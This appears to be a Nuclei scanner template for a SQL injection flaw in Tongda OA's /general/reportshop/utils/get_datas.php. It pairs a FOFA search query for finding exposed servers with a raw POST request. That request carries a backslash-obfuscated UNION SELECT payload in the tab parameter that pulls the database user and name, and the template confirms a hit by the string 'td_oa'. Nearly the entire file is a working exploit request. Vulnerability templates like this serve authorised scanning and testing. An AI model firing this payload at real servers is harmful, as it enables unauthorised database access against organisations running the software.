id: tongda-oa-get_datas-sqli

info:
  name: 通达 OA get_datas.php - sqli
  author: leadlife
  severity: high
  description: 
  metadata:
    verified: true
    fofa-query: app="TDXK-通达OA"
  tags: sqli,oa,tongda,hw

http:
  - raw:
      - |
        POST /general/reportshop/utils/get_datas.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 122

        USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 whe\re 1={`\='` 1} un\ion (s\elect user(),database() fr\om user whe\re 1\={`=` 1})-- '

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body,'td_oa')
        condition: and
